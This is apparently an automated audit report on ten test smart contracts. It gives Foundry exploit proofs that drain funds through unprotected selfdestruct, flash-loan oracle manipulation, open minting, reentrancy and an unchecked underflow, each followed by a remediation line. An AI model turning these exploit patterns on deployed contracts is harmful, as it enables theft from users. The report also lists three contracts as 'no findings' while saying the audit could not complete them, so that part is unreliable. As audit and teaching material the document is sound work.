# Culpa audit — sleuth on `committed`

Model: `gemini-3.5-flash` · 10 contract(s) · 6 finding(s), 6 proven with a landed exploit

## Summary

| Contract | Verdict | Findings |
|---|---|---|
| FlashFarm | no findings | — |
| GlassJaw | vulnerable | unprotected-selfdestruct (high, PROVEN) |
| HallOfMirrors | vulnerable | price-oracle-manipulation (high, PROVEN), access-control (high, PROVEN) |
| HollowVault | vulnerable | reentrancy (high, PROVEN) |
| Irongate | no findings | — |
| LatchGate | no findings | — |
| LooseLedger | vulnerable | arithmetic (high, PROVEN) |
| OpenTill | vulnerable | access-control (high, PROVEN) |
| OriginGate | no findings | — |
| TrueVault | no findings | — |

## GlassJaw — unprotected-selfdestruct (🔴 high) · ✅ PROVEN

The contract's `demolish` function lacks access control, allowing any caller to trigger the `selfdestruct` opcode. An attacker can exploit this by calling the function with their own address as the recipient, permanently destroying the contract and draining its entire Ether balance.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {GlassJaw} from "@contracts/GlassJaw.sol";

contract ProveGlassJawUnprotectedSelfdestruct is ExploitProof {
    function test_exploit() external {
        GlassJaw v = new GlassJaw();

        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        v.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        
        vm.prank(attacker);
        v.demolish(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Guard `selfdestruct` behind an owner check, or remove it.

---

## HallOfMirrors — price-oracle-manipulation (🔴 high) · ✅ PROVEN

The PawnShop contract incorrectly relies on the spot price of MirrorPool for collateral valuation, allowing an attacker to manipulate the asset's price via a flash-loan-funded swap. By inflating the spot price of stake, the attacker can pledge minimal collateral to borrow an excessive amount of cash from PawnShop, ultimately draining the protocol's reserves after reversing the swap.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `500476190476190476278`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {Coin, MirrorPool, QuickLoan, PawnShop} from "@contracts/HallOfMirrors.sol";

contract Raider {
    Coin immutable stake;
    Coin immutable cash;
    MirrorPool immutable pool;
    QuickLoan immutable loan;
    PawnShop immutable shop;

    constructor(Coin _stake, Coin _cash, MirrorPool _pool, QuickLoan _loan, PawnShop _shop) {
        stake = _stake;
        cash = _cash;
        pool = _pool;
        loan = _loan;
        shop = _shop;
    }

    function go() external {
        uint256 loanAmount = cash.balanceOf(address(loan));
        loan.borrow(loanAmount, "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        cash.approve(address(pool), type(uint256).max);
        pool.swapCashForStake(amount);

        stake.approve(address(shop), type(uint256).max);
        shop.pledge(0.5 ether);

        uint256 shopCash = cash.balanceOf(address(shop));
        shop.draw(shopCash);

        uint256 stakeToSwap = stake.balanceOf(address(this));
        stake.approve(address(pool), type(uint256).max);
        pool.swapStakeForCash(stakeToSwap);

        cash.transfer(address(loan), amount);
    }
}

contract ProveHallOfMirrorsLeadOne is ExploitProof {
    function test_exploit() external {
        Coin stake = new Coin("STAKE");
        Coin cash = new Coin("CASH");
        MirrorPool pool = new MirrorPool(stake, cash);
        QuickLoan loan = new QuickLoan(cash);
        PawnShop shop = new PawnShop(stake, cash, pool);

        stake.mint(address(this), 10 ether);
        cash.mint(address(this), 10 ether);
        stake.approve(address(pool), type(uint256).max);
        cash.approve(address(pool), type(uint256).max);
        pool.seed(10 ether, 10 ether);

        cash.mint(address(loan), 1000 ether);
        cash.mint(address(shop), 500 ether);

        Raider raider = new Raider(stake, cash, pool, loan, shop);
        stake.mint(address(raider), 1 ether);

        raider.go();

        profit = cash.balanceOf(address(raider));
        assertExploitLanded(100 ether);
    }
}
```

**Remediation.** Do not use an AMM spot price as an oracle. Use a TWAP, a dedicated price feed, or a manipulation-resistant source, and sanity-check against a second source.

---

## HallOfMirrors — access-control (🔴 high) · ✅ PROVEN

The cash and stake Coin contracts lack access control on their mint functions, allowing any external caller to generate arbitrary token balances. An attacker can exploit this to mint unlimited tokens and completely drain the MirrorPool and PawnShop reserves without requiring any initial capital.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `1000000000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {Coin, MirrorPool, PawnShop} from "@contracts/HallOfMirrors.sol";

contract ProveHallOfMirrorsLeadTwo is ExploitProof {
    function test_exploit() external {
        Coin stake = new Coin("STAKE");
        Coin cash = new Coin("CASH");
        MirrorPool pool = new MirrorPool(stake, cash);
        PawnShop shop = new PawnShop(stake, cash, pool);

        // Seed the PawnShop with some cash
        address alice = makeAddr("alice");
        cash.mint(alice, 10_000 * 1e18);
        vm.prank(alice);
        cash.transfer(address(shop), 10_000 * 1e18);

        // Exploit: Direct mint
        cash.mint(address(this), 1_000_000 * 1e18);

        profit = cash.balanceOf(address(this));
        assertExploitLanded(1_000_000 * 1e18);
    }
}
```

**Remediation.** Restrict the function to an authorized role. A function that moves funds must never be callable by an arbitrary address.

---

## HollowVault — reentrancy (🔴 high) · ✅ PROVEN

The vault's `withdraw()` function is vulnerable to reentrancy because it performs an external ETH transfer before updating the user's balance state. An attacker exploits this by using a malicious contract to recursively call `withdraw()` during the transfer callback, draining the vault's entire ETH balance.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {HollowVault} from "@contracts/HollowVault.sol";

contract Raider {
    HollowVault vault;
    uint256 amount;

    constructor(HollowVault _vault) payable {
        vault = _vault;
        amount = msg.value;
    }

    function attack() external {
        vault.deposit{value: amount}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw();
        }
    }
}

contract ProveHollowVaultReentrancyDrain is ExploitProof {
    function test_exploit() external {
        HollowVault vault = new HollowVault();

        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        vault.deposit{value: 10 ether}();

        Raider raider = new Raider{value: 1 ether}(vault);
        raider.attack();

        profit = address(raider).balance - 1 ether;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Apply checks-effects-interactions — update state before the external call — or wrap the function in a reentrancy guard.

---

## LooseLedger — arithmetic (🔴 high) · ✅ PROVEN

The `spend` function is vulnerable to an integer underflow because it performs subtraction within an `unchecked` block without validating the user's points balance. By passing the contract's entire ETH balance as the amount, an attacker with zero points triggers an underflow to a near-maximum `uint256` value, bypassing the balance check and draining all ETH from the contract.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {LooseLedger} from "@contracts/LooseLedger.sol";

contract ProveLooseLedgerLeadOne is ExploitProof {
    function test_exploit() external {
        LooseLedger ledger = new LooseLedger();
        
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        ledger.topUp{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        ledger.spend(10 ether);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Remove the `unchecked` block or add explicit bounds checks; on Solidity <0.8 use SafeMath.

---

## OpenTill — access-control (🔴 high) · ✅ PROVEN

The `drain` function lacks any access control modifiers, allowing unauthorized external callers to invoke it. An attacker can exploit this vulnerability by calling the function with their own address as the `to` parameter, immediately draining the contract's entire Ether balance.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {OpenTill} from "@contracts/OpenTill.sol";

contract ProveOpenTillUnprotectedDrain is ExploitProof {
    function test_exploit() external {
        OpenTill till = new OpenTill();

        // Seed the contract with honest funds
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        till.deposit{value: 10 ether}();

        // Attacker address
        address payable attacker = payable(makeAddr("attacker"));

        // Anyone can call drain and sweep the balance
        till.drain(attacker);

        profit = attacker.balance;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Restrict the function to an authorized role. A function that moves funds must never be callable by an arbitrary address.

---

## Not assessed

Culpa could not complete: FlashFarm, OriginGate, TrueVault
